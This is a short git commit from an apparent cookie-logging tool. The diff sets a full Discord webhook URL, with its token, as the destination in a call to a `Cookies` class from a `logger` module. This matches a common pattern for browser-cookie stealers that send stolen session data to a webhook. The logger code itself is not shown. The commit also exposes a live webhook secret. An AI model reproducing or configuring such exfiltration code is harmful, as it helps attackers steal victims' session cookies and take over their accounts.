4c217db4c128350b1ab74cf54e65699f9237425d
aakashghimire752-droid <aakashghimire752@gmail.com>
2026-09-06 01:50:02 +0545

    Update webhook URL in main.py

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 from logger import Cookies
 
-log = Cookies('weebhook url here')
+log = Cookies('https://discord.com/api/webhooks/1544372950327758966/Zm-Ezc2S9rynP7ugERO0pOfLa95nZQxGTUpuLxti1v75aXBijbUferlTHdwgjwT0jO8c')
 
 def main():
   while True:
